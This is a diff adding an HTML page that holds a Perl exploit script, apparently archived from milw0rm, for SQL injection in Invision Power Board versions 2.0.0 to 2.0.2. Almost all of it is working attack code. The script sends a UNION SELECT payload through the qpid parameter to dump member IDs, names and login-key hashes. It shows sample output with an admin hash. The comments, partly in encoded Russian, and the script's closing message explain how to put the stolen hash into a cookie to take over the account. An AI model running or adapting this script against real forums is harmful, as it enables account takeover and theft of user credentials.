@@ -1,0 +1,172 @@
+<html><head><title>Invision Power Board v2.0.0 - 2.0.2 Sql Injection Exploit</title></head><pre>#!/usr/bin/perl
+use IO::Socket;
+
+			      #    #        #    #                                                                                                                                                                                                                                                                                                                                    
+			      #   #          #   #                                                                                                                                                                                                                                                                                                                                    
+			     #    #          #    #                                                                                                                                                                                                                                                                                                                                   
+			     #   ##   ####   ##   #                                                                                                                                                                                                                                                                                                                                   
+			    ##   ##  ######  ##   ##                                                                                                                                                                                                                                                                                                                                  
+			    ##   ##  ######  ##   ##                                                                                                                                                                                                                                                                                                                                  
+			    ##   ##   ####   ##   ##                                                                                                                                                                                                                                                                                                                                  
+			    ###   ############   ###                                                                                                                                                                                                                                                                                                                                  
+			    ########################                                                                                                                                                                                                                                                                                                                                  
+			         ##############                                                                                                                                                                                                                                                                                                                                       
+			  ######## ########## #######                                                                                                                                                                                                                                                                                                                                 
+			 ###   ##  ##########  ##   ###                                                                                                                                                                                                                                                                                                                               
+			 ###   ##  ##########  ##   ###                                                                                                                                                                                                                                                                                                                               
+			  ###   #  ##########  #   ###                                                                                                                                                                                                                                                                                                                                
+			  ###   ##  ########  ##   ###                                                                                                                                                                                                                                                                                                                                
+			   ##    #   ######   #    ##                                                                                                                                                                                                                                                                                                                                 
+			    ##   #    ####   #    ##                                                                                                                                                                                                                                                                                                                                  
+ 			     ##                 ##           
+
+## Invision Power Board v2.0.0 - 2.0.2 sql injection exploit
+## by RusH security team (www.rst.void.ru)
+## coded by 1dt.w0lf
+## ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+## example:
+##
+## r57ipb.pl 127.0.0.1 /IPB202/ 2 1 3edb1eaeea640d297ee3b1f78b5679b3
+## ------------------------------------------------------------------------------------------------
+## [&gt;] SERVER: 127.0.0.1
+## [&gt;]    DIR: /IPB202/
+## [&gt;]  FORUM: 2
+## [&gt;]  TOPIC: 1
+## [&gt;]    SID: 3edb1eaeea640d297ee3b1f78b5679b3
+## [&gt;] PREFIX:
+## [&gt;]     ID:
+## ------------------------------------------------------------------------------------------------
+## 
+## [~] PREPARE TO CONNECT...
+## [+] CONNECTED
+## [~] SENDING QUERY...
+## [+] DONE!
+## 
+## PREFIX: ibf_
+##
+## r57ipb.pl 127.0.0.1 /IPB202/ 2 1 3edb1eaeea640d297ee3b1f78b5679b3 ibf_
+## ------------------------------------------------------------------------------------------------
+## [&gt;] SERVER: 127.0.0.1
+## [&gt;]    DIR: /IPB202/
+## [&gt;]  FORUM: 2
+## [&gt;]  TOPIC: 1
+## [&gt;]    SID: 3edb1eaeea640d297ee3b1f78b5679b3
+## [&gt;] PREFIX: ibf_
+## [&gt;]     ID:
+## ------------------------------------------------------------------------------------------------
+## 
+## [~] PREPARE TO CONNECT...
+## [+] CONNECTED
+## [~] SENDING QUERY...
+## [+] DONE!
+## 
+## --[ REPORT ]------------------------------------------------------------------------------------
+## MEMBER_ID: [1] NAME: [admin] PASS_HASH: [73dea61281aa9b08ed31b4ae2bb9954e]
+## ------------------------------------------------------------------------------------------------
+## Now you need edit cookie and insert new pass_hash and member_id values.
+## ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+## &amp;#1055;&amp;#1072;&amp;#1088;&amp;#1091; &amp;#1089;&amp;#1083;&amp;#1086;&amp;#1074; &amp;#1086; &amp;#1074;&amp;#1086;&amp;#1079;&amp;#1074;&amp;#1088;&amp;#1072;&amp;#1097;&amp;#1072;&amp;#1077;&amp;#1084;&amp;#1086;&amp;#1084; &amp;#1101;&amp;#1082;&amp;#1089;&amp;#1087;&amp;#1083;&amp;#1086;&amp;#1080;&amp;#1090;&amp;#1086;&amp;#1084; &amp;#1088;&amp;#1077;&amp;#1079;&amp;#1091;&amp;#1083;&amp;#1100;&amp;#1090;&amp;#1072;&amp;#1090;&amp;#1077;:
+## &amp;#1047;&amp;#1085;&amp;#1072;&amp;#1095;&amp;#1077;&amp;#1085;&amp;#1080;&amp;#1077; pass_hash &amp;#1101;&amp;#1090;&amp;#1086; &amp;#1085;&amp;#1077; &amp;#1079;&amp;#1072;&amp;#1096;&amp;#1080;&amp;#1092;&amp;#1088;&amp;#1086;&amp;#1074;&amp;#1072;&amp;#1085;&amp;#1085;&amp;#1099;&amp;#1081; &amp;#1087;&amp;#1072;&amp;#1088;&amp;#1086;&amp;#1083;&amp;#1100; &amp;#1102;&amp;#1079;&amp;#1077;&amp;#1088;&amp;#1072;!!! &amp;#1072; &amp;#1086;&amp;#1076;&amp;#1085;&amp;#1086;&amp;#1080;&amp;#1084;&amp;#1077;&amp;#1085;&amp;#1085;&amp;#1086;&amp;#1077; &amp;#1079;&amp;#1085;&amp;#1072;&amp;#1095;&amp;#1077;&amp;#1085;&amp;#1080;&amp;#1077; &amp;#1080;&amp;#1079; &amp;#1082;&amp;#1091;&amp;#1082;&amp;#1080;&amp;#1089;&amp;#1072; &amp;#1089;
+## &amp;#1087;&amp;#1086;&amp;#1084;&amp;#1086;&amp;#1097;&amp;#1100;&amp;#1102; &amp;#1082;&amp;#1086;&amp;#1090;&amp;#1086;&amp;#1088;&amp;#1086;&amp;#1075;&amp;#1086; &amp;#1084;&amp;#1086;&amp;#1078;&amp;#1085;&amp;#1086; &amp;#1074;&amp;#1086;&amp;#1081;&amp;#1090;&amp;#1080; &amp;#1085;&amp;#1072; &amp;#1092;&amp;#1086;&amp;#1088;&amp;#1091;&amp;#1084; &amp;#1087;&amp;#1086;&amp;#1076; &amp;#1083;&amp;#1102;&amp;#1073;&amp;#1099;&amp;#1084; &amp;#1102;&amp;#1079;&amp;#1077;&amp;#1088;&amp;#1086;&amp;#1084; &amp;#1073;&amp;#1077;&amp;#1079; &amp;#1074;&amp;#1074;&amp;#1086;&amp;#1076;&amp;#1072; &amp;#1087;&amp;#1072;&amp;#1088;&amp;#1086;&amp;#1083;&amp;#1103;. 
+## member_id &amp;#1101;&amp;#1090;&amp;#1086; &amp;#1090;&amp;#1072;&amp;#1082;&amp;#1078;&amp;#1077; &amp;#1086;&amp;#1076;&amp;#1085;&amp;#1086;&amp;#1080;&amp;#1084;&amp;#1077;&amp;#1085;&amp;#1085;&amp;#1086;&amp;#1077; &amp;#1079;&amp;#1085;&amp;#1072;&amp;#1095;&amp;#1077;&amp;#1085;&amp;#1080;&amp;#1077; &amp;#1080;&amp;#1079; &amp;#1082;&amp;#1091;&amp;#1082;&amp;#1080;&amp;#1089;&amp;#1072;.
+## &amp;#1055;&amp;#1086;&amp;#1101;&amp;#1090;&amp;#1086;&amp;#1084;&amp;#1091; &amp;#1085;&amp;#1077; &amp;#1089;&amp;#1090;&amp;#1086;&amp;#1080;&amp;#1090; &amp;#1087;&amp;#1099;&amp;#1090;&amp;#1072;&amp;#1090;&amp;#1100;&amp;#1089;&amp;#1103; &amp;#1088;&amp;#1072;&amp;#1089;&amp;#1096;&amp;#1080;&amp;#1092;&amp;#1088;&amp;#1086;&amp;#1074;&amp;#1072;&amp;#1090;&amp;#1100; pass_hash =) &amp;#1055;&amp;#1088;&amp;#1086;&amp;#1089;&amp;#1090;&amp;#1086; &amp;#1079;&amp;#1072;&amp;#1088;&amp;#1077;&amp;#1075;&amp;#1080;&amp;#1089;&amp;#1090;&amp;#1088;&amp;#1080;&amp;#1088;&amp;#1091;&amp;#1081;&amp;#1090;&amp;#1077;&amp;#1089;&amp;#1100; &amp;#1085;&amp;#1072; &amp;#1092;&amp;#1086;&amp;#1088;&amp;#1091;&amp;#1084;&amp;#1077; &amp;#1080; &amp;#1080;&amp;#1079;&amp;#1084;&amp;#1077;&amp;#1085;&amp;#1080;&amp;#1090;&amp;#1077;
+## pass_hash &amp;#1080; member_id &amp;#1074; &amp;#1074;&amp;#1072;&amp;#1096;&amp;#1077;&amp;#1084; cookie &amp;#1085;&amp;#1072; &amp;#1086;&amp;#1076;&amp;#1085;&amp;#1086; &amp;#1080;&amp;#1079; &amp;#1079;&amp;#1085;&amp;#1072;&amp;#1095;&amp;#1077;&amp;#1085;&amp;#1080;&amp;#1081; &amp;#1082;&amp;#1086;&amp;#1090;&amp;#1086;&amp;#1088;&amp;#1099;&amp;#1077; &amp;#1074;&amp;#1099;&amp;#1076;&amp;#1072;&amp;#1089;&amp;#1090; &amp;#1089;&amp;#1087;&amp;#1083;&amp;#1086;&amp;#1080;&amp;#1090;.
+## ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+if (@ARGV &lt; 5)
+{
+print &quot;-------------------------------------------------------------------------\r\n&quot;;
+print &quot;       Invision Power Board v2.0.0 - 2.0.2 sql injection exploit\r\n&quot;;
+print &quot;-------------------------------------------------------------------------\r\n&quot;;
+print &quot;usage:\r\n&quot;;
+print &quot;r57ipb.pl SERVER /DIR/ FORUM_NUM TOPIC_NUM SID [TABLE_PREFIX] [USER_ID]\r\n\r\n&quot;;
+print &quot;SERVER         - server where IPB installed\r\n&quot;;
+print &quot;/DIR/          - IPB directory or / for no directory\r\n&quot;;
+print &quot;FORUM_NUM      - number of existing forum\r\n&quot;;
+print &quot;TOPIC_NUM      - number of existing topic\r\n&quot;;
+print &quot;SID            - your session id\r\n&quot;;
+print &quot;[TABLE_PREFIX] - table prefix in database\r\n&quot;;
+print &quot;[USER_ID]      - user id for exploiting\r\n\r\n&quot;; 
+print &quot;e.g. r57ipb.pl 127.0.0.1 /IPB/ 2 1 4496b6d35c1bc0662d721c207f81784e ibf_\r\n&quot;;
+print &quot;-------------------------------------------------------------------------\r\n&quot;;
+exit();
+}
+
+if (@ARGV &lt; 6) { $get_table = 1; }
+
+$server = $ARGV[0];
+$dir    = $ARGV[1];
+$fnum   = $ARGV[2];
+$tnum   = $ARGV[3];
+$sid    = $ARGV[4];
+$prefix = $ARGV[5];
+$id     = $ARGV[6];
+
+print &quot;------------------------------------------------------------------------------------------------\r\n&quot;;
+print &quot;[&gt;] SERVER: $server\r\n&quot;;
+print &quot;[&gt;]    DIR: $dir\r\n&quot;;
+print &quot;[&gt;]  FORUM: $fnum\r\n&quot;;
+print &quot;[&gt;]  TOPIC: $tnum\r\n&quot;;
+print &quot;[&gt;]    SID: $sid\r\n&quot;;
+print &quot;[&gt;] PREFIX: $prefix\r\n&quot;;
+print &quot;[&gt;]     ID: $id\r\n&quot;;
+print &quot;------------------------------------------------------------------------------------------------\r\n\r\n&quot;;
+
+$server =~ s/(http:\/\/)//eg;
+
+$path  = $dir;
+$path .= &quot;index.php?s=&quot;;
+$path .= $sid;
+$path .= &quot;&amp;act=Post&amp;CODE=02&amp;f=&quot;;
+$path .= $fnum;
+$path .= &quot;&amp;t=&quot;;
+$path .= $tnum;
+if ($get_table == 1) 
+ {
+ $path .= &quot;&amp;qpid=r57&quot;
+ }
+else
+ {
+$path .= &quot;&amp;qpid=666666666)%20union%20select%201,1,1,1,1,1,1,1,1,1,CONCAT(id,char(58),name,char(58),member_login_key),1,1,1,1,1,1,1,1,1%20from%20&quot;;
+$path .= $prefix;
+$path .= &quot;members&quot;;
+$path .= ($id)?(&quot;%20WHERE%20id=$id%20&quot;):(&quot;%20&quot;);
+$path .= &quot;/*&quot;;
+ }
+print &quot;[~] PREPARE TO CONNECT...\r\n&quot;;
+
+$socket = IO::Socket::INET-&gt;new( Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$server&quot;, PeerPort =&gt; &quot;80&quot;) || die &quot;[-] CONNECTION FAILED&quot;;
+
+print &quot;[+] CONNECTED\r\n&quot;;
+print &quot;[~] SENDING QUERY...\r\n&quot;;
+print $socket &quot;GET $path HTTP/1.1\r\n&quot;;
+print $socket &quot;Host: $server\r\n&quot;;                                                                                                                                                          
+print $socket &quot;Accept: */*\r\n&quot;;
+print $socket &quot;Connection: close\r\n\r\n&quot;;
+print &quot;[+] DONE!\r\n\r\n&quot;;
+
+$suc =0;
+
+if ($get_table == 1)
+ {
+ while ($answer = &lt;$socket&gt;)
+  {
+  if ($answer =~ /(mySQL query error: )(.*)( FROM )(.*)(posts)/){ print &quot;PREFIX: $4\r\n&quot;; $suc = 1; }
+  }
+ if (!$suc) { print &quot;Exploit failed\r\n&quot;; }
+ exit();
+ }
+
+print &quot;--[ REPORT ]------------------------------------------------------------------------------------\r\n&quot;;
+while ($answer = &lt;$socket&gt;)
+{
+ if ($answer =~ /^([^:]*):([^:]*):([a-z,0-9]{32})$/) { print &quot;MEMBER_ID: [$1] NAME: [$2] PASS_HASH: [$3]\r\n&quot;; $suc = 1; }
+}
+print &quot;------------------------------------------------------------------------------------------------\r\n&quot;;
+if ($suc == 1) { print &quot;Now you need edit cookie and insert new pass_hash and member_id values.\r\n&quot;; exit(); }
+else { print &quot;Exploit failed\r\n&quot;; }
+
+
+
+# milw0rm.com [2004-11-22]</pre></html>
